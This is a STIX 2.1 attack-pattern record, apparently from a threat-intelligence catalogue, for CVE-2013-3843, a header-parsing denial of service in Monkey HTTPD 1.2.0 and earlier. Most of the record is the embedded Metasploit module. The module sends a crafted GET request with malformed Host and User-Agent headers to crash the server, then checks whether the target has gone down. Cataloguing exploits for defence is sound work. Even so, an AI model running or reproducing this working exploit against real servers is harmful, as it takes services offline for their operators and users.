{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--57180871-6e5e-47c7-a54a-7e56fec175ed",
    "created": "2024-08-14T16:26:16.17031Z",
    "modified": "2024-08-14T16:26:16.170314Z",
    "name": "Monkey HTTPD Header Parsing Denial of Service (DoS)",
    "description": " This module causes improper header parsing that leads to a segmentation fault due to a specially crafted HTTP request. Affects version <= 1.2.0. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/monkey_headers.rb",
            "external_id": "monkey_headers.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3843"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Monkey HTTPD Header Parsing Denial of Service (DoS)',\n      'Description'    => %q{\n          This module causes improper header parsing that leads to a segmentation fault\n        due to a specially crafted HTTP request. Affects version <= 1.2.0.\n      },\n      'Author'         =>\n        [\n          'Doug Prostko <dougtko[at]gmail.com>'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2013-3843'],\n          ['OSVDB', '93853'],\n          ['BID', '60333']\n        ],\n      'DisclosureDate' => '2013-05-30'))\n\n    register_options(\n      [\n        Opt::RPORT(2001)\n      ])\n  end\n\n  def dos\n    req = \"GET / HTTP/1.1\\r\\n\"\n    req << \"Host:\\r\\n\\r\\nlocalhost\\r\\n\"\n    req << \"User-Agent:\\r\\n\\r\\n\"\n\n    connect\n    sock.put(req)\n    disconnect\n  end\n\n  def is_alive?\n    begin\n      connect\n    rescue Rex::ConnectionRefused\n      return false\n    ensure\n      disconnect\n    end\n\n    true\n  end\n\n  def run\n    print_status(\"#{rhost}:#{rport} - Sending DoS packet...\")\n    dos\n\n    print_status(\"#{rhost}:#{rport} - Checking server status...\")\n    select(nil, nil, nil, 1)\n\n    if is_alive?\n      print_error(\"#{rhost}:#{rport} - Server is still alive\")\n    else\n      print_good(\"#{rhost}:#{rport} - Connection Refused: Success!\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-30"
}